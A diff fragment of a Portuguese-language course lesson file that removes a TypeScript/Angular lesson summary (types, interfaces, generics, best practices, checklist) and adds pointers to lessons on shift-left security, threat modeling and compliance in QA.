-- **Tipos Básicos**: `string`, `number`, `boolean`, `null`, `undefined`, `any`, `void`, `never`, `unknown`
-- **Interfaces**: Contratos que definem estruturas de objetos, permitindo reutilização e consistência
-- **Classes**: Estruturas que encapsulam dados (propriedades) e comportamentos (métodos) com modificadores de acesso
-- **Decorators**: Funções especiais que modificam classes, métodos ou propriedades em tempo de compilação
-- **Generics**: Permitem criar código reutilizável que funciona com múltiplos tipos mantendo type safety
-- **Módulos ES6**: Sistema de organização de código em arquivos separados com import/export
-- **Type Narrowing**: Processo de restringir tipos baseado em verificações (type guards)
-- **Utility Types**: Tipos utilitários como `Partial`, `Pick`, `Omit`, `Required` para transformações de tipo
-
-### Pontos-Chave para Lembrar
-
-- **Tipos Explícitos**: Sempre use tipos explícitos em funções públicas para melhor legibilidade e prevenção de erros
-- **Interfaces vs Types**: Interfaces são preferíveis para estruturas de objetos, types para unions e tipos mais complexos
-- **Evite `any`**: Use `unknown` quando o tipo é desconhecido e faça type narrowing com type guards
-- **Generics**: Mantêm type safety em código genérico e reutilizável
-- **Organização**: Separe tipos em arquivos dedicados, use módulos ES6 para organização clara
-- **Strict Mode**: Habilite strict mode no `tsconfig.json` para máxima type safety
-- **Readonly**: Use `readonly` para propriedades imutáveis e prevenir modificações acidentais
-- **Type Guards**: Use type guards para narrowing seguro de tipos `unknown` ou union types
-
-### Comparações Importantes
-
-- **TypeScript vs JavaScript**: TypeScript adiciona verificação de tipos em compile-time sem mudar runtime
-- **TypeScript vs Flow**: TypeScript tem maior adoção e melhor suporte em frameworks modernos
-- **TypeScript vs Linguagens Estritamente Tipadas**: TypeScript oferece tipagem gradual e compatibilidade total com JavaScript
-
-### Próximos Passos
-
-- **Próxima Aula**: Componentes Standalone e Templates
-- **Prática Recomendada**: 
-  - Criar interfaces para estruturas de dados do seu projeto
-  - Implementar classes tipadas com modificadores de acesso
-  - Explorar generics criando funções e classes reutilizáveis
-  - Experimentar utility types em transformações de dados
-  - Configurar strict mode no projeto Angular
-- **Aprofundamento**: 
-  - Explorar tipos avançados (conditional types, mapped types)
-  - Estudar padrões de design TypeScript
-  - Praticar type guards e narrowing
-  - Aprender sobre declaration merging e module augmentation
+- **Aula 1.3**: Shift-Left Security - Como integrar segurança desde o início
+- **Aula 1.4**: Threat Modeling - Identificar ameaças proativamente
+- **Aula 1.5**: Compliance e Regulamentações - LGPD, PCI-DSS, SOC2
 
 ---
 
-## Checklist de Qualidade
-
-Antes de considerar esta aula completa:
-
-- [x] Introdução clara e envolvente
-- [x] Todos os conceitos têm definições e explicações detalhadas
-- [x] Analogias presentes para conceitos abstratos
-- [x] Diagramas ASCII para visualização de conceitos complexos
-- [x] Exemplos práticos completos e funcionais
-- [x] Boas práticas e anti-padrões documentados
-- [x] Exercícios práticos ordenados por dificuldade
-- [x] Referências externas validadas e organizadas
-- [x] Resumo com pontos principais
-
----
-
-**Aula Anterior**: [Aula 1.1: Introdução ao Angular](./lesson-1-1-introducao-angular.md)  
-**Próxima Aula**: [Aula 1.3: Componentes Standalone e Templates](./lesson-1-3-componentes-standalone.md)  
-**Voltar ao Módulo**: [Módulo 1: Fundamentos Acelerados](../modules/module-1-fundamentos-acelerados.md)
+**Duração da Aula**: 90 minutos  
+**Nível**: Básico  
+**Pré-requisitos**: Aula 1.1 (Introdução à Segurança em QA)
